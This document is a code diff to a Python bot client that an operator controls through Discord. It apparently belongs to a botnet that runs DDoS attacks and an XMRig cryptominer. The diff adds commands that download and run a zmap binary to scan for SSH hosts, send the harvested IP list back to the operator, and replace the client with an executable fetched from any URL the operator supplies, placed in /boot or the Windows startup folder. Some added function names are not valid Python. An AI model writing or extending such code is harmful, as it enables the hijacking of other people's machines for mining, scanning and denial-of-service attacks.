@@ -3,8 +3,6 @@ import requests, platform, discord, urllib, psutil, socket, sys, os
 
 token = 'abc' # Token
 channel_id = 111111111 # Channel ID
-linux_link = https://github.com/NAME/NAME/raw/main/NAME # Linux URL (for !update command)
-windows_link = https://github.com/NAME/NAME/raw/main/NAME.exe # Windows URL (for !update command)
 
 # bot
 intents = discord.Intents.default()
@@ -52,21 +50,27 @@ async def check(ctx):
             await ctx.send(f"``[+] {hostname}@{ip}: DDoS running``")
         else:
             await ctx.send(f"``[-] {hostname}@{ip}: DDoS not running``")
+
+        if "zmap" in (i.name() for i in psutil.process_iter()):
+            await ctx.send(f"``[+] {hostname}@{ip}: ZMap running``")
+        else:
+            await ctx.send(f"``[-] {hostname}@{ip}: ZMap not running``")
     else:
         if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
             await ctx.send(f"``[+] {hostname}@{ip}: Miner running``")
         else:
             await ctx.send(f"``[-] {hostname}@{ip}: Miner not running``")
     
-# update
+# update linux
 @bot.command()
-async def update(ctx):
+async def update-linux(ctx, LinuxLinkArg):
+    linux_link = ''.join(LinuxLinkArg)
     if platform.system() == 'Linux':
         os.chdir("/boot")
         if os.path.exists("Client"):
             os.remove("Client")
         
-        r = requests.get(linux_link, allow_redirects=True)
+        r = requests.get(LinuxLinkArg, allow_redirects=True)
         open("Client", 'wb').write(r.content)
         
         if os.path.exists("Client"):
@@ -75,12 +79,17 @@ async def update(ctx):
             sys.exit()
         else:
             os.chdir("/tmp")
-    else:
+    
+# update windows
+@bot.command()
+async def update-windows(ctx, WindowsLinkArg):
+    windows_link = ''.join(WindowsLinkArg)
+    if platform.system() == 'Windows':
         os.chdir(startup)
         if os.path.exists("Client.exe"):
             os.remove("Client.exe")
         
-        r = requests.get(linux_link, allow_redirects=True)
+        r = requests.get(WindowsLinkArg, allow_redirects=True)
         open("Client.exe", 'wb').write(r.content)
         
         if os.path.exists("Client.exe"):
@@ -144,6 +153,33 @@ async def stopminer(ctx):
             os.popen("taskkill /F /IM xmrig.exe /T")
             await ctx.send(f"``[-] {hostname}@{ip}: Miner stoped``")
     
+# zmap
+@bot.command()
+async def zmap(ctx):
+    if platform.system() == 'Linux':
+        if not os.path.exists("zmap"):
+            url = "https://github.com/rxu7s/Public/raw/main/zmap"
+            r = requests.get(url, allow_redirects=True)
+            open("zmap", 'wb').write(r.content)
+
+        os.popen("zmap -B 10M -p 22 -n 90 -o iplist.txt")
+        await ctx.send(f"``[+] {hostname}@{ip}: ZMap started``")
+
+# stop zmap
+@bot.command()
+async def stopzmap(ctx):
+    if platform.system() == 'Linux':
+        if "zmap" in (i.name() for i in psutil.process_iter()):
+            os.popen("pkill zmap")
+            await ctx.send(f"``[-] {hostname}@{ip}: ZMap stoped``")
+
+# zmap reports
+@bot.command()
+async def zmapreport(ctx):
+    if platform.system() == 'Linux':
+        if os.path.exists("iplist.txt"):
+            await ctx.send(f"``[+] {hostname}@{ip}: ZMap report``",file=discord.File("iplist.txt"))
+
 
 # ----- Self Commands ----- #
 
